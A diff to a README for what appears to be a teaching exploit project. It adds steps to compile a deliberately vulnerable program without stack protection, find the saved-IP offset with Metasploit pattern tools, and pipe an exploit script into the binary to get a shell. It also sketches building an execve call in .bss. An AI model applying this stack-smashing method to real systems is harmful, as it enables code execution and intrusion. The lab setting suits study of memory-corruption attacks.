@@ -1,5 +1,22 @@
-libcless exploit
-================
+How to test
+===========
+
+1. Build vuln.c
+
+    gcc -fno-stack-protector ../vuln.c -o /tmp/vuln -m32 -O2
+
+2. Find the offset of the saved IP
+
+    ruby19 "$METASPLOIT/tools/pattern_create.rb" 256 | /tmp/vuln
+    dmesg | tail
+    ruby19 "$METASPLOIT/tools/pattern_offset.rb" $SEGFAULT_IP
+
+3. Launch the attack with the desired parameter
+
+    (python ./exploit.py /tmp/vuln $OFFSET; echo ls) | /tmp/vuln
+
+Basic idea
+==========
 
 char *buffer = .bss;
 char *new_stack = buffer + 1024;
@@ -7,7 +24,7 @@ int *rubbish = new_stack + 4;
 
 strcpy(buffer, "execve");
   *((int *) buffer) = 'exec';
-  *(((int *) buffer) + 1) = 've\0\0';  
+  *(((int *) buffer) + 1) = 've\0\0';
 char *name = buffer;
 buffer += strlen(buffer) + 1;
 
